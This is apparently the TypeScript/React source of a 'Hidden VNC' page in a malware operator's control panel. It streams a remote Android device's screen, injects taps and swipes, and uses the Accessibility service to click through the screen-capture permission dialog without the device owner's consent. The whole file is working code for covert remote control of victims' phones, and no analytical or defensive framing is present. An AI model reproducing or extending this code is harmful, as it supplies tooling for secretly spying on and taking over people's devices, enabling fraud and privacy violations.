import { useRef, useState, useEffect, useCallback } from 'react';
import { useOutletContext } from 'react-router-dom';
import { clientsApi } from '@/services/api';
import { CMD } from '@/types';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Input } from '@/components/ui/input';
import { Monitor, Play, Square, Loader2, Settings2, MousePointerClick, Camera as CameraIcon } from 'lucide-react';
import { onHvncUpdate, getAdminSocket } from '@/services/socket';
import {
  DevicePageHeader, ErrorAlert, LoadingSkeleton, StatusBadge, SectionCard, EmptyState,
} from '@/components/device/shared';
import type { DeviceOutletContext } from '@/types';
import type { Socket } from 'socket.io-client';

const DECODE_QUEUE_LIMIT = 5;
const STALE_CHUNK_MS = 5000;
const CHUNK_SWEEP_INTERVAL_MS = 2000;
const MAX_CONCURRENT_TRANSFERS = 16;
const START_TIMEOUT_MS = 30000;
const DECODER_RECREATE_COOLDOWN_MS = 1000;

type HvncMeta = { id: string; type: string; [key: string]: unknown };

interface ChunkBuf {
  received: Map<number, Uint8Array>;
  total: number;
  totalSize: number;
  pts: number;
  keyframe: boolean;
  createdAt: number;
}

export default function HvncPage() {
  const { clientId: id, online } = useOutletContext<DeviceOutletContext>();
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [streaming, setStreaming] = useState(false);
  const [status, setStatus] = useState<string>('idle');
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [fps, setFps] = useState(20);
  const [quality, setQuality] = useState(60);
  const [scale, setScale] = useState(50);
  const [iframeInterval, setIframeInterval] = useState(0);
  const [showSettings, setShowSettings] = useState(false);
  const [accessibilityEnabled, setAccessibilityEnabled] = useState<boolean | null>(null);
  const [accessibilityConnected, setAccessibilityConnected] = useState<boolean | null>(null);
  const [codecInfo, setCodecInfo] = useState<string>('');
  const [socketConnected, setSocketConnected] = useState(!!getAdminSocket()?.connected);

  const decoderRef = useRef<VideoDecoder | null>(null);
  const chunkBufferRef = useRef<Map<string, ChunkBuf>>(new Map());
  const lastDrawnPtsRef = useRef<number>(-1);
  const frameCountRef = useRef<number>(0);
  const fpsTimerRef = useRef<number>(0);
  const lastRecreateRef = useRef<number>(0);
  const mountedRef = useRef<boolean>(true);
  const streamingRef = useRef<boolean>(false);
  const startTimeoutRef = useRef<number | null>(null);
  const startingRef = useRef<boolean>(false);

  useEffect(() => { streamingRef.current = streaming; }, [streaming]);

  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      if (streamingRef.current && id) {
        clientsApi.sendCommand(id, CMD.HVNC, { action: 'stop' }).catch(() => {});
      }
    };
  }, [id]);

  useEffect(() => {
    setStreaming(false);
    setStatus('idle');
    setError(null);
    setCodecInfo('');
    setAccessibilityEnabled(null);
    setAccessibilityConnected(null);
    lastDrawnPtsRef.current = -1;
    chunkBufferRef.current.clear();
    if (id) {
      clientsApi.sendCommand(id, CMD.HVNC, { action: 'status' }).catch(() => {});
    }
  }, [id]);

  const createDecoder = useCallback(() => {
    if (!mountedRef.current) return null;
    if (typeof window === 'undefined' || !('VideoDecoder' in window)) {
      setError('This browser does not support WebCodecs. Use Chrome 94+ or Edge 94+ for HVNC.');
      return null;
    }
    try {
      const decoder = new VideoDecoder({
        output: (frame: VideoFrame) => {
          const canvas = canvasRef.current;
          if (!canvas || !mountedRef.current) { frame.close(); return; }
          if (frame.timestamp < lastDrawnPtsRef.current) {
            frame.close();
            return;
          }
          lastDrawnPtsRef.current = frame.timestamp;
          if (canvas.width !== frame.displayWidth) canvas.width = frame.displayWidth;
          if (canvas.height !== frame.displayHeight) canvas.height = frame.displayHeight;
          const ctx = canvas.getContext('2d');
          if (ctx) ctx.drawImage(frame, 0, 0);
          frame.close();

          frameCountRef.current++;
          const now = performance.now();
          if (fpsTimerRef.current === 0) fpsTimerRef.current = now;
          if (now - fpsTimerRef.current > 1000) {
            const measuredFps = Math.round(frameCountRef.current * 1000 / (now - fpsTimerRef.current));
            setCodecInfo(prev => {
              const base = prev.replace(/\s*@\d+fps$/, '').trim();
              return base ? `${base} @${measuredFps}fps` : `@${measuredFps}fps`;
            });
            frameCountRef.current = 0;
            fpsTimerRef.current = now;
          }
        },
        error: (e: DOMException) => {
          console.error('VideoDecoder error', e);
          if (!mountedRef.current) return;
          setError(`Decoder error: ${e.message}. Recovering…`);
          try { decoderRef.current?.close(); } catch {}
          const now = Date.now();
          if (now - lastRecreateRef.current < DECODER_RECREATE_COOLDOWN_MS) {
            decoderRef.current = null;
            setError(`Decoder error: ${e.message}. Stream paused. Click Stop then Start to recover.`);
            return;
          }
          lastRecreateRef.current = now;
          decoderRef.current = createDecoder();
          if (decoderRef.current && id) {
            clientsApi.sendCommand(id, CMD.HVNC, { action: 'status' }).catch(() => {});
          }
        },
      });
      return decoder;
    } catch (e) {
      setError(`Failed to init VideoDecoder: ${e instanceof Error ? e.message : String(e)}`);
      return null;
    }
  }, []);

  useEffect(() => {
    decoderRef.current = createDecoder();
    return () => {
      try {
        if (decoderRef.current?.state === 'configured') {
          decoderRef.current.flush();
        }
        decoderRef.current?.close();
      } catch {}
      decoderRef.current = null;
    };
  }, [createDecoder]);

  useEffect(() => {

    let attachedSocket: Socket | null = null;
    const onConn = () => setSocketConnected(true);
    const onDisc = () => setSocketConnected(false);
    const poll = setInterval(() => {
      const s = getAdminSocket();
      if (s && s === attachedSocket) return;
      if (s) {
        if (attachedSocket) {
          attachedSocket.off('connect', onConn);
          attachedSocket.off('disconnect', onDisc);
        }
        attachedSocket = s;
        s.on('connect', onConn);
        s.on('disconnect', onDisc);
        setSocketConnected(s.connected);
      }
    }, 2000);

    const s0 = getAdminSocket();
    if (s0) {
      attachedSocket = s0;
      s0.on('connect', onConn);
      s0.on('disconnect', onDisc);
      setSocketConnected(s0.connected);
    }
    return () => {
      clearInterval(poll);
      if (attachedSocket) {
        attachedSocket.off('connect', onConn);
        attachedSocket.off('disconnect', onDisc);
      }
    };
  }, []);

  useEffect(() => {
    const unsub = onHvncUpdate((meta: HvncMeta, binary?: ArrayBuffer) => {
      if (!meta || meta.id !== id) return;

      if (meta.type === 'config' && binary) {
        lastDrawnPtsRef.current = -1;
        chunkBufferRef.current.clear();

        let decoder = decoderRef.current;
        if (!decoder || decoder.state === 'closed') {
          decoderRef.current = createDecoder();
          decoder = decoderRef.current;
          if (!decoder) return;
        } else if (decoder.state === 'configured') {
          try { decoder.flush().catch(() => {}); } catch {}
        }
        try {
          const config: VideoDecoderConfig = {
            codec: 'avc1.42001e',
            description: new Uint8Array(binary),
            optimizeForLatency: true,
          };
          decoder.configure(config);
          const w = meta.width ?? '?';
          const h = meta.height ?? '?';
          setCodecInfo(`H.264 ${w}x${h}`);
        } catch (e) {
          setError(`Decoder config failed: ${e instanceof Error ? e.message : String(e)}`);
          try { decoder.close(); } catch {}
          decoderRef.current = null;
        }
      } else if (meta.type === 'frame' && binary) {
        const decoder = decoderRef.current;
        if (!decoder || decoder.state !== 'configured') return;
        const isKey = meta.keyframe === true;
        if (!isKey && decoder.decodeQueueSize > DECODE_QUEUE_LIMIT) {
          return;
        }
        try {
          const chunk = new EncodedVideoChunk({
            type: isKey ? 'key' : 'delta',
            timestamp: Number(meta.pts) || 0,
            data: new Uint8Array(binary),
          });
          decoder.decode(chunk);
        } catch {}
      } else if (meta.type === 'chunk' && binary) {
        const transferId = typeof meta.transferId === 'string' ? meta.transferId : '';
        if (!transferId) return;
        const total = Number(meta.totalChunks);
        if (!Number.isFinite(total) || total <= 0) return;
        const idx = Number(meta.chunkIndex);
        if (!Number.isFinite(idx) || idx < 0 || idx >= total) return;

        let buf = chunkBufferRef.current.get(transferId);
        if (!buf) {
          if (chunkBufferRef.current.size >= MAX_CONCURRENT_TRANSFERS) {
            let oldestId: string | null = null;
            let oldestTime = Infinity;
            for (const [tid, b] of chunkBufferRef.current) {
              if (b.createdAt < oldestTime) { oldestTime = b.createdAt; oldestId = tid; }
            }
            if (oldestId) chunkBufferRef.current.delete(oldestId);
          }
          buf = {
            received: new Map(),
            total,
            totalSize: Number(meta.totalSize) || 0,
            pts: Number(meta.pts) || 0,
            keyframe: meta.keyframe === true,
            createdAt: Date.now(),
          };
          chunkBufferRef.current.set(transferId, buf);
        } else if (buf.total !== total) {
          chunkBufferRef.current.delete(transferId);
          buf = {
            received: new Map(),
            total,
            totalSize: Number(meta.totalSize) || 0,
            pts: Number(meta.pts) || 0,
            keyframe: meta.keyframe === true,
            createdAt: Date.now(),
          };
          chunkBufferRef.current.set(transferId, buf);
        }
        buf.received.set(idx, new Uint8Array(binary));
        buf.createdAt = Date.now();

        if (buf.received.size === buf.total) {
          try {
            const full = new Uint8Array(buf.totalSize);
            let offset = 0;
            for (let i = 0; i < buf.total; i++) {
              const piece = buf.received.get(i);
              if (!piece) { chunkBufferRef.current.delete(transferId); return; }
              if (offset + piece.length > full.length) {
                console.warn(`HVNC: frame ${transferId} overflow at ${i}`);
                chunkBufferRef.current.delete(transferId);
                return;
              }
              full.set(piece, offset);
              offset += piece.length;
            }
            chunkBufferRef.current.delete(transferId);
            const decoder = decoderRef.current;
            if (decoder && decoder.state === 'configured') {
              const isKey = buf.keyframe === true;
              if (!isKey && decoder.decodeQueueSize > DECODE_QUEUE_LIMIT) {
                return;
              }
              try {
                const chunk = new EncodedVideoChunk({
                  type: isKey ? 'key' : 'delta',
                  timestamp: buf.pts,
                  data: full,
                });
                decoder.decode(chunk);
              } catch {}
            }
          } catch (e) {
            console.error('HVNC: frame reassembly failed', e);
            chunkBufferRef.current.delete(transferId);
          }
        }
      } else if (meta.type === 'status') {
        if (startTimeoutRef.current) {
          clearTimeout(startTimeoutRef.current);
          startTimeoutRef.current = null;
        }
        const statusStr = typeof meta.status === 'string' ? meta.status : 'unknown';
        setStatus(statusStr);
        setStreaming(meta.streaming === true);
        setAccessibilityEnabled(meta.accessibilityEnabled === true);
        setAccessibilityConnected(meta.accessibilityConnected === true);
        if (statusStr === 'no_permission' || statusStr === 'permission_denied') {
          setError('Screen capture permission was not granted or was denied. The device user must approve the permission dialog.');
          setStatus('idle');
          setStreaming(false);
          startingRef.current = false;
        } else if (statusStr === 'auto_accept_failed:accessibility_not_enabled') {
          setError('Accessibility service is off. Settings page opened on device. Enable it under Accessibility, then retry.');
          setStatus('idle');
          setStreaming(false);
          startingRef.current = false;
        } else if (statusStr.startsWith('auto_accept_failed')) {
          setError('Auto-accept failed (' + statusStr + '). The device user must approve the permission dialog manually.');
          setStatus('idle');
          setStreaming(false);
          startingRef.current = false;
        } else if (statusStr === 'streaming') {
          setError(null);
          setStreaming(true);
          startingRef.current = false;
        } else if (statusStr === 'projection_failed') {
          setError('Screen capture session ended (projection failed). Click Start Stream to begin a new session.');
          setStatus('idle');
          setStreaming(false);
          startingRef.current = false;
        } else if (statusStr.startsWith('error')) {
          setError(statusStr);
        }
      } else if (meta.type === 'input_ack') {
        if (meta.completed !== true) {
          console.warn('HVNC: gesture cancelled by device');
        }
      }
    });
    return unsub;
  }, [id, createDecoder]);

  useEffect(() => {
    const timer = setInterval(() => {
      const now = Date.now();
      for (const [tid, b] of chunkBufferRef.current) {
        if (now - b.createdAt > STALE_CHUNK_MS) {
          chunkBufferRef.current.delete(tid);
        }
      }
    }, CHUNK_SWEEP_INTERVAL_MS);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    if (!id) return;
    clientsApi.getOne(id)
      .then(() => setLoading(false))
      .catch((err: any) => {
        setError(err?.response?.status === 404 ? 'Device not found' : 'Failed to load device');
        setLoading(false);
      });
  }, [id]);

  useEffect(() => {
    return () => {
      if (startTimeoutRef.current) {
        clearTimeout(startTimeoutRef.current);
        startTimeoutRef.current = null;
      }
    };
  }, [id]);

  const startStream = useCallback(async () => {
    if (!id) return;
    setError(null);
    setStatus('starting');
    startingRef.current = true;
    lastDrawnPtsRef.current = -1;
    chunkBufferRef.current.clear();
    const d = decoderRef.current;
    if (d?.state === 'configured') { try { d.flush().catch(() => {}); } catch {} }
    if (startTimeoutRef.current) clearTimeout(startTimeoutRef.current);
    startTimeoutRef.current = window.setTimeout(() => {
      if (!streamingRef.current) {
        setStatus('idle');
        setError('Device did not respond to start command within 30s. It may be offline.');
        clientsApi.sendCommand(id, CMD.HVNC, { action: 'stop' }).catch(() => {});
      }
    }, START_TIMEOUT_MS);
    try {
      await clientsApi.sendCommand(id, CMD.HVNC, { action: 'start', fps, jpegQuality: quality, scale, iframeInterval });
    } catch (err: any) {
      setError(err?.response?.data?.error || 'Failed to start stream');
      setStatus('idle');
      startingRef.current = false;
      if (startTimeoutRef.current) { clearTimeout(startTimeoutRef.current); startTimeoutRef.current = null; }
    }
  }, [id, fps, quality, scale, iframeInterval]);

  const stopStream = useCallback(async () => {
    if (!id) return;
    startingRef.current = false;
    if (startTimeoutRef.current) { clearTimeout(startTimeoutRef.current); startTimeoutRef.current = null; }
    try { await clientsApi.sendCommand(id, CMD.HVNC, { action: 'stop' }); } catch (err: any) { console.warn('Failed to stop stream:', err); }
    const d = decoderRef.current;
    if (d?.state === 'configured') { try { d.flush().catch(() => {}); } catch {} }
    chunkBufferRef.current.clear();
    setStreaming(false);
    setStatus('idle');
  }, [id]);

  const sendInput = useCallback(async (inputType: string, x: number, y: number, dx?: number, dy?: number) => {
    if (!id || !streaming) return;
    try {
      await clientsApi.sendCommand(id, CMD.HVNC, {
        action: 'input',
        inputType,
        x: Math.round(x),
        y: Math.round(y),
        ...(dx !== undefined ? { dx: Math.round(dx) } : {}),
        ...(dy !== undefined ? { dy: Math.round(dy) } : {}),
      });
    } catch {}
  }, [id, streaming]);

  const checkStatus = useCallback(async () => {
    if (!id) return;
    try { await clientsApi.sendCommand(id, CMD.HVNC, { action: 'status' }); } catch (err: any) { console.warn('Failed to check status:', err); }
  }, [id]);

  const enableAccessibility = useCallback(async () => {
    if (!id) return;
    try {
      await clientsApi.sendCommand(id, CMD.HVNC, { action: 'enable_accessibility' });
    } catch (err: any) {
      setError(err?.response?.data?.error || 'Failed to enable accessibility');
    }
  }, [id]);

  const dragRef = useRef<{ startX: number; startY: number; startTime: number } | null>(null);

  const getCanvasCoords = useCallback((clientX: number, clientY: number) => {
    const canvas = canvasRef.current;
    if (!canvas) return null;
    const rect = canvas.getBoundingClientRect();
    const sx = canvas.width / rect.width;
    const sy = canvas.height / rect.height;
    return { x: (clientX - rect.left) * sx, y: (clientY - rect.top) * sy };
  }, []);

  const handlePointerDown = useCallback((clientX: number, clientY: number) => {
    const coords = getCanvasCoords(clientX, clientY);
    if (!coords) return;
    dragRef.current = { startX: coords.x, startY: coords.y, startTime: Date.now() };
  }, [getCanvasCoords]);

  const handlePointerUp = useCallback((clientX: number, clientY: number) => {
    if (!dragRef.current) return;
    const coords = getCanvasCoords(clientX, clientY);
    if (!coords) { dragRef.current = null; return; }
    const dx = coords.x - dragRef.current.startX;
    const dy = coords.y - dragRef.current.startY;
    const elapsed = Date.now() - dragRef.current.startTime;
    const DRAG_THRESHOLD = 10;
    const LONGPRESS_THRESHOLD = 500;
    if (Math.abs(dx) < DRAG_THRESHOLD && Math.abs(dy) < DRAG_THRESHOLD) {
      if (elapsed >= LONGPRESS_THRESHOLD) {
        sendInput('longpress', dragRef.current.startX, dragRef.current.startY);
      } else {
        sendInput('tap', dragRef.current.startX, dragRef.current.startY);
      }
    } else {
      sendInput('swipe', dragRef.current.startX, dragRef.current.startY, dx, dy);
    }
    dragRef.current = null;
  }, [getCanvasCoords, sendInput]);

  const handleMouseDown = useCallback((e: React.MouseEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    handlePointerDown(e.clientX, e.clientY);
  }, [handlePointerDown]);

  const handleMouseUp = useCallback((e: React.MouseEvent<HTMLCanvasElement>) => {
    handlePointerUp(e.clientX, e.clientY);
  }, [handlePointerUp]);

  const handleTouchStart = useCallback((e: React.TouchEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    const t = e.touches[0];
    if (t) handlePointerDown(t.clientX, t.clientY);
  }, [handlePointerDown]);

  const handleTouchEnd = useCallback((e: React.TouchEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    const t = e.changedTouches[0];
    if (t) handlePointerUp(t.clientX, t.clientY);
  }, [handlePointerUp]);

  const snapshot = useCallback(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    try {
      canvas.toBlob((blob) => {
        if (!blob) return;
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `hvnc-snapshot-${id}-${Date.now()}.png`;
        a.click();

        setTimeout(() => URL.revokeObjectURL(url), 1000);
      }, 'image/png');
    } catch {}
  }, [id]);

  if (loading) {
    return <LoadingSkeleton rows={4} />;
  }

  const canAct = online && socketConnected;

  return (
    <div className="space-y-4">
      <DevicePageHeader
        title="HVNC: Hidden VNC"
        subtitle={`Remote screen view + touch control${codecInfo ? ` · ${codecInfo}` : ''}`}
        badge={{ label: streaming ? 'Streaming' : 'Stopped', variant: streaming ? 'default' : 'secondary' }}
        actions={[
          ...(!streaming
            ? [{ label: 'Start Stream', icon: Play, onClick: startStream, disabled: !canAct || status === 'starting', variant: 'default' as const }]
            : [{ label: 'Stop Stream', icon: Square, onClick: stopStream, disabled: !canAct, variant: 'destructive' as const }]),
          { label: streaming ? 'Snapshot' : '', icon: CameraIcon, onClick: snapshot, disabled: !streaming, variant: 'outline' as const },
          { label: 'Settings', icon: Settings2, onClick: () => setShowSettings(!showSettings), variant: showSettings ? 'default' : 'outline' as const },
          { label: 'Status', icon: undefined, onClick: checkStatus, variant: 'outline' as const },
        ]}
        refresh={checkStatus}
        loading={status === 'starting'}
      />

      {}
      <div className="flex items-center gap-2 flex-wrap">
        <StatusBadge label={streaming ? 'Streaming' : 'Stopped'} status={streaming ? 'success' : 'neutral'} />
        {accessibilityEnabled === false && (
          <StatusBadge label="Input Off" status="danger" />
        )}
        {accessibilityEnabled === true && accessibilityConnected === false && (
          <StatusBadge label="Input Not Ready" status="warning" />
        )}
        {accessibilityEnabled === true && accessibilityConnected === true && (
          <StatusBadge label="Input On" status="success" />
        )}
        {!online && <StatusBadge label="Device Offline" status="danger" />}
      </div>

      {status === 'starting' && !streaming && !error && (
        <div className="p-3 rounded-lg bg-amber-500/10 border border-amber-500/20 text-amber-700 dark:text-amber-400 text-sm flex items-start gap-2">
          <Loader2 className="h-4 w-4 shrink-0 mt-0.5 animate-spin" />
          <div>
            <p className="font-medium">Asking device to start screen capture…</p>
            <p className="text-xs mt-1 opacity-80">
              The device will show a system permission dialog. If the device&apos;s
              Accessibility service is enabled, auto-accept will click through it
              within a few seconds; otherwise the device user must approve it
              manually (timeout 30s).
            </p>
          </div>
        </div>
      )}

      {error && <ErrorAlert message={error} onRetry={checkStatus} />}

      {accessibilityEnabled === false && (
        <div className="flex items-center gap-2">
          <Button variant="outline" onClick={enableAccessibility} disabled={!canAct} className="gap-2 text-amber-600" title="Open Accessibility Settings on device">
            <Settings2 className="h-4 w-4" /> Enable Input
          </Button>
        </div>
      )}

      {showSettings && (
        <SectionCard title="Stream Settings" icon={Settings2}>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className="space-y-1">
              <Label className="text-xs">FPS (1-60)</Label>
              <Input type="number" value={fps} min={1} max={60} onChange={e => setFps(Math.max(1, Math.min(60, parseInt(e.target.value) || 20)))} disabled={streaming} />
            </div>
            <div className="space-y-1">
              <Label className="text-xs">Quality (10-100)</Label>
              <Input type="number" value={quality} min={10} max={100} onChange={e => setQuality(Math.max(10, Math.min(100, parseInt(e.target.value) || 60)))} disabled={streaming} />
            </div>
            <div className="space-y-1">
              <Label className="text-xs">Scale % (10-100)</Label>
              <Input type="number" value={scale} min={10} max={100} onChange={e => setScale(Math.max(10, Math.min(100, parseInt(e.target.value) || 50)))} disabled={streaming} />
            </div>
            <div className="space-y-1">
              <Label className="text-xs">Keyframe interval seconds (0 = every frame is a keyframe)</Label>
              <Input type="number" value={iframeInterval} min={0} max={10} onChange={e => setIframeInterval(Math.max(0, Math.min(10, parseInt(e.target.value) || 0)))} disabled={streaming} />
            </div>
          </div>
          {streaming && <p className="text-xs text-muted-foreground mt-3">Stop the stream to change settings.</p>}
        </SectionCard>
      )}

      <Card className="shadow-none">
        <CardContent className="p-0">
          <div className="relative bg-black flex items-center justify-center overflow-hidden" style={{ minHeight: '300px' }}>
            {streaming ? (
              <canvas
                ref={canvasRef}
                onMouseDown={handleMouseDown}
                onMouseUp={handleMouseUp}
                onTouchStart={handleTouchStart}
                onTouchEnd={handleTouchEnd}
                aria-label="Remote device screen"
                className="max-w-full max-h-[70vh] cursor-pointer touch-none"
                style={{ imageRendering: 'auto' }}
              />
            ) : (
              <EmptyState
                icon={Monitor}
                title="No stream active"
                description='Click "Start Stream" to begin'
                action={{ label: 'Start Stream', onClick: startStream, disabled: !canAct }}
              />
            )}
          </div>
          {streaming && (
            <div className="px-4 py-2 bg-muted/50 border-t flex items-center gap-2 text-xs text-muted-foreground">
              <MousePointerClick className="h-3 w-3" />
              Click to tap · Click & drag to swipe · Long-press for context menu
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
